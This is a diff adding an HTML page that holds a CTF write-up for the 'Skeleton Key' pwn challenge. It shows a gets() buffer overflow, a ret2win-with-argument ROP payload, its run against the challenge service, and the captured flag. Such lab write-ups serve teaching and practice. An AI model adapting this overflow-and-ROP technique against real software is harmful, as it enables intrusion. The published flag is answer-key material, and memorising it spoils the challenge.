@@ -1,0 +1,47 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Skeleton Key — Writeup — arwah</title><meta name="description" content="Sequel to The Crypt. The binary greets you with &quot;Well, deep in that old crypt, you found your key... but do you know how to use it?&quot; — this time the win function takes an argument:…"><link rel="icon" href="/favicon.svg"><link rel="stylesheet" href="/writeups/writeups.css?v=20261019-2"></head><body><header class="library-nav"><a href="/#writeups">← Portfolio</a><a href="/writeups/">Writeup library</a></header><main><div class="article-meta">Binary Exploitation · 2 min read</div><details class="contents"><summary>On this page</summary><ul><li><a href="#summary">Summary</a></li><li><a href="#analysis">Analysis</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#flag">Flag</a></li></ul></details><article class="prose"><h1 id="skeleton-key-writeup">Skeleton Key — Writeup</h1>
+<p><strong>Category:</strong> Pwn
+<strong>Flag:</strong> <code>deadface{R355UR3CT_D34D_C0D3}</code></p>
+<h2 id="summary">Summary</h2>
+<p>Sequel to <em>The Crypt</em>. The binary greets you with
+<em>&quot;Well, deep in that old crypt, you found your key... but do you know how to
+use it?&quot;</em> — this time the win function takes an argument: <code>Wretched_Lock(int)</code>
+only unlocks <code>flag.txt</code> when <code>arg == 0xdeadc0de</code>. The binary ships its own ROP
+gadget, so the &quot;skeleton key&quot; is a ret2win-with-argument.</p>
+<h2 id="analysis">Analysis</h2>
+<pre><code class="language-c">// main (0x401578) — unbounded read into a 64-byte stack buffer
+char buf[64];
+gets(buf);                       // rbp-0x40 -&gt; 72 bytes to saved RIP
+
+// Wretched_Lock (0x401507) — the dead lock, never called
+void Wretched_Lock(int key) {
+    if (key == 0xdeadc0de) {                    // the &quot;dead code&quot;
+        FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+        ...                                      // cats it
+    }
+}
+
+// gadgets (0x401615) — provided by the author
+pop rdi ; ret
+pop rsi ; pop rdx ; ret
+ret
+</code></pre>
+<p>Non-PIE, no canary. Offset to saved RIP is again 64 + 8 = <strong>72</strong>.</p>
+<h2 id="exploit">Exploit</h2>
+<p>Load <code>0xdeadc0de</code> into <code>rdi</code> with the bundled <code>pop rdi; ret</code>, then return into
+<code>Wretched_Lock</code>:</p>
+<pre><code class="language-python">payload = b&quot;A&quot; * 72
+payload += p64(0x401615)      # pop rdi ; ret
+payload += p64(0xdeadc0de)    # value -&gt; rdi
+payload += p64(0x401507)      # Wretched_Lock(0xdeadc0de)
+</code></pre>
+<p>Verified locally, then fired at the service (same host as The Crypt, next
+port):</p>
+<pre><code>$ python3 exploit.py 159.65.228.107 5002
+ Well, deep in that old crypt, you found your key...
+ ...But do you know how to use it? Let us see:  deadface{R355UR3CT_D34D_C0D3}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>deadface{R355UR3CT_D34D_C0D3}
+</code></pre>
+<p>Resurrected dead code indeed.</p>
+</article><a class="back-link" href="/writeups/">← All writeups</a></main><footer>CTF solutions &amp; security notes · arwah</footer></body></html>
